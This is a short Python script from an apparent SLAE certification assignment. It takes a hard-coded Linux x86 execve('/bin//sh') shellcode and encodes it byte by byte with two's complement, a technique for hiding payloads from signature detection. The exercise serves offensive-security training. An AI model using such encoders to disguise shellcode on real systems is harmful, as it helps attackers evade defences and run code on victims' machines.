#!/usr/bin/python

"""
 Filename:   two_complement_encoder.py
 Author:     Samuel Dugo
 SLAE-ID:    SLAE-1376
 Purpose:    Assignment #4 of SLAE certification. This code will encode a given shellcode using the two's complement method.
"""

import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print('Encoding shellcode ...')

for x in bytearray(shellcode) :
     bin_int = '{0:08b}'.format(x)
     flipped_bin = '{0:08b}'.format(int(bin_int,2) ^ int(bin(0xFF),2))
     two_complement = '{0:08b}'.format(int(flipped_bin,2) + int('1',2))
     two_complement_hex = hex(int(two_complement,2))
     encoded += '\\x' + ('%02x' % int(two_complement,2))
     encoded2 += two_complement_hex + ','

print('Len: %d' % len(bytearray(shellcode)))
print(encoded)
print(encoded2[:-1])
